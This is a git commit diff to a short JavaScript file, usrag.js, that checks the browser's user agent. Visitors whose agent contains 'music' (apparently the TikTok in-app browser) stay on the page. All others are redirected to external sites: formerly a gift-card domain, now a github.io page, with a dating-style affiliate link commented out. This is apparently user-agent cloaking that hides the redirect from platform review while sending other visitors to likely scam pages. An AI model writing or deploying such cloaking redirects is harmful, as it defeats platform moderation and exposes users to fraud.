cb293d045e6acfc48b06cfef19901ef60e22186c
tik1tok <jardeinsharon57@gmail.com>
2026-08-03 18:01:06 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  window.location = 'https://giftcards4u.site/';
+  window.location = 'https://tik1tok.github.io/1/';
 //  window.location = 'https://r3n2br5.your-partnerstheflirting.com/y7wbku6';
 }
 // document.querySelector('body').innerText = agent;
